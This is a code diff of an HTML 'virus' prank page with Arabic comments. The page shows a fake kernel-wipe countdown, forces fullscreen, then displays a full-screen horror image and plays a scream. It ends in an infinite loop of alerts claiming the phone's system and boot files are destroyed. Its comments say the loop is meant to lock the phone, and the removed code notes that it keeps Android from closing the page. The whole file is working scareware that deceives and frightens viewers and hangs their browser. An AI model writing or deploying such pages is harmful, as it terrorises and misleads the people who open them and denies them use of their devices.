@@ -3,53 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_FAILURE_FOUKA</title>
+    <title>SYSTEM_CRITICAL_ERROR</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
-        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; display: none; z-index: 9999; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
+        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #ff0000; box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; background: radial-gradient(circle, #100 0%, #000 100%); text-align: center; }
+        #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 30px #ff0000; margin: 20px 0; }
+        .glitch { font-size: 18px; animation: flash 0.1s infinite; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         
-        /* تأثير اللاق والاهتزاز */
-        .lag-effect { animation: shake 0.1s infinite; }
-        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 2px); } }
-
-        #warningBox { 
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            color: #ff0000; border: 3px solid #ff0000; padding: 30px; font-family: 'Courier New', monospace;
-            background: rgba(0,0,0,0.9); text-align: center; font-weight: bold; z-index: 100;
-        }
+        /* الصورة المرعبة بملء الشاشة */
+        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
     </style>
 </head>
-<body onclick="executeTotalVirus()">
+<body onclick="startVirus()">
 
-    <div id="warningBox" class="lag-effect">
-        ⚠️ ALERT: SYSTEM_CORRUPTION_DETECTED ⚠️<br><br>
-        جاري تدمير ملفات الـ Hardware...<br>
-        [إضغط هنا لإيقاف العملية]
+    <div id="terminal">
+        <div class="glitch">⚠️ UNAUTHORIZED ACCESS DETECTED ⚠️</div>
+        <div id="countdown">30</div>
+        <div style="color: #0ff; font-size: 12px;">
+            > KERNEL_WIPEOUT: INITIATED...<br>
+            > STATUS: PERMANENT_BRICKING_STARTED
+        </div>
     </div>
-    
+
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     
-    <audio id="scaryVoice" src="https://www.myinstants.com/media/sounds/tfy-krk-79938.mp3" loop></audio>
+    <audio id="screamSfx" src="tfy-krk.mp3" preload="auto"></audio>
 
     <script>
-        function executeTotalVirus() {
-            // 1. ملء الشاشة الفوري ومنع الخروج
-            document.documentElement.requestFullscreen().catch(() => {});
-            
-            // 2. تفعيل الصورة والصوت الإجباري
-            document.getElementById('warningBox').style.display = 'none';
-            document.getElementById('horrorImg').style.display = 'block';
-            document.getElementById('scaryVoice').play();
+        let seconds = 30;
+        let active = false;
 
-            // 3. توليد "لاق" وهمي وضغط على المعالج برسائل Alert متتالية
+        function startVirus() {
+            if (active) return;
+            active = true;
+
+            // تفعيل ملء الشاشة
+            document.documentElement.requestFullscreen().catch(() => {});
+
+            let timer = setInterval(() => {
+                seconds--;
+                document.getElementById('countdown').innerText = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    triggerScare();
+                }
+            }, 1000);
+        }
+
+        function triggerScare() {
+            // تشغيل الصوت وإظهار الصورة
+            document.getElementById('terminal').style.display = 'none';
+            document.getElementById('horrorImg').style.display = 'block';
+            document.getElementById('screamSfx').play();
+
+            // قفل الهاتف بالرسائل اللانهائية
             setTimeout(() => {
                 while(true) {
-                    alert("⚠️ خطأ قاتل: تم حرق ملفات الـ Boot بنجاح.");
-                    alert("FATAL_ERROR: YOUR_PHONE_IS_DYING...");
-                    alert("لا تحاول الضغط على زر الرجوع، لقد فات الأوان.");
-                    // تكرار الرسائل يمنع نظام الأندرويد من غلق الصفحة بسهولة
+                    alert("⚠️ خطأ قاتل: تم تدمير ملفات النظام الأساسية.");
+                    alert("FATAL_ERROR: YOUR_PHONE_IS_GONE");
                 }
-            }, 300);
+            }, 100);
         }
     </script>
 </body>
